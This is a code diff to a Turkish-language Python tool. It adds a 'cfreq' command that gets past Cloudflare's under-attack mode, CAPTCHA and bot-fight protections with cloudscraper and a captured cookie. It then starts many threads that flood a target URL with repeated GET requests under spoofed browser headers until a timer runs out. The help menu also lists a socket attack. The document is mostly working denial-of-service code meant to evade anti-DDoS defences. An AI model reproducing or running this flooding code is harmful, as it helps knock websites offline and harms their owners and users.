@@ -69,7 +69,17 @@ def komut():
             timer.join()
         else:
             stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypass İşlemi Başarısız!\n")
-
+    # CFReq
+    elif komut == "cfreq":
+        target, thread, t = bilgi_cek()
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypasslanıyor... (Maksimum 60s)\n")
+        if cookie_cek(target):
+            timer = threading.Thread(target=zamanlayici, args=(t,))
+            timer.start()
+            SaldiriCfREQ(target, thread, t)
+            timer.join()
+        else:
+            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypass İşlemi Başarısız!\n")
 
 # Komut İşlem
 
@@ -92,6 +102,7 @@ def clear():
 def yardim():
     stdout.write("\x1b[38;2;0;236;250m╔══════════════════════════════════════════════╗\n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "cfsoc = UAM, CAPTCHA, BFM bypasslar. (socket) \n")
+    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "cfreq = UAM, CAPTCHA, BFM bypasslar. (request) \n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "socket = Socket saldırısı yapar.  \n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "yardim = Komutları ve açıklamalarını gösterir.  \n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "gelistiriciler = Geliştiricileri gösterir.  \n")
@@ -223,6 +234,45 @@ def CFSOCSaldiri(until_datetime, target, req):
                 packet.send(str.encode(req))
         except:
             packet.close()
+            pass
+
+# CFReq            
+
+def İslemCFREQ(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    session = requests.Session()
+    scraper = cloudscraper.create_scraper(sess=session)
+    jar = RequestsCookieJar()
+    jar.set(cookieJAR['name'], cookieJAR['value'])
+    scraper.cookies = jar
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=SaldiriCfREQ, args=(url, until, scraper))
+            thd.start()
+        except:
+            pass
+
+def SaldiriCfREQ(url, until_datetime, scraper):
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'TE': 'trailers',
+    }
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+        except:
             pass
 
 # Cookie Çek
